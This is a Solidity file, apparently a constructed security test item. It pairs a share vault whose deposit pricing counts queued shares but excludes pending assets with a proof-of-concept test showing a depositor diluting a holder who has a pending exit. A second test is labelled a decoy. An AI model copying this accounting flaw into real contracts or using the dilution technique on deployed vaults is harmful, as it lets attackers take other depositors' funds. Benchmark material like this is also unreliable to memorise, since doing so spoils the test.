// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Base,Token,ERC20} from "common/Support.sol";
contract Queue {
    address immutable vault=msg.sender;
    uint256 public pending;
    function reserve(uint256 a) external { require(msg.sender==vault); pending+=a; }
}
contract Vault is ERC20 {
    Token public immutable asset;
    Queue public immutable queue;
    constructor(Token t,address seed) ERC20("Share","SH") {
        asset=t; queue=new Queue(); _mint(seed,100);
    }
    function assets() public view returns (uint256) {
        return asset.balanceOf(address(this))-queue.pending();
    }
    function deposit(uint256 a) external {
        uint256 s=a*totalSupply()/assets();
        asset.transferFrom(msg.sender,address(this),a);
        _mint(msg.sender,s);
    }
    function request(uint256 s) external {
        uint256 a=s*assets()/(totalSupply()-balanceOf(address(queue)));
        _transfer(msg.sender,address(queue),s);
        queue.reserve(a);
    }
    function redeem(uint256 s) external {
        uint256 a=s*assets()/(totalSupply()-balanceOf(address(queue)));
        _burn(msg.sender,s);
        asset.transfer(msg.sender,a);
    }
}
contract Proof is Base {
    function setup() internal returns(Token t,Vault v) {
        t=new Token(); v=new Vault(t,ALICE); t.mint(address(v),100);
    }
    function testDecoyFailedTransferCannotMintUnfundedShares() external {
        (Token t,Vault v)=setup(); t.mint(BOB,30);
        vm.prank(BOB);
        (bool ok,)=address(v).call(abi.encodeCall(v.deposit,(30)));
        require(!ok && v.balanceOf(BOB)==0 && t.balanceOf(address(v))==100,"failed transfer changed value");
        vm.prank(BOB); t.approve(address(v),type(uint256).max);
        vm.prank(BOB);
        (ok,)=address(v).call(abi.encodeCall(v.deposit,(31)));
        require(!ok && v.balanceOf(BOB)==0 && t.balanceOf(BOB)==30,"insufficient balance minted shares");
        vm.prank(BOB); v.deposit(30);
        require(v.balanceOf(BOB)==30 && t.balanceOf(address(v))==130,"funded path failed");
    }
    function testRealPendingExitDilutesActiveHolder() external {
        (Token t,Vault v)=setup();
        vm.prank(ALICE); v.request(40);
        t.mint(BOB,30); vm.prank(BOB); t.approve(address(v),30);
        vm.prank(BOB); v.deposit(30);
        require(v.balanceOf(BOB)==50,"no excess shares");
        vm.prank(BOB); v.redeem(50);
        vm.prank(ALICE); v.redeem(60);
        require(t.balanceOf(BOB)==40 && t.balanceOf(ALICE)==50,"no realized dilution");
        require(t.balanceOf(address(v))==40 && v.queue().pending()==40,"reserved exit changed");
    }
}
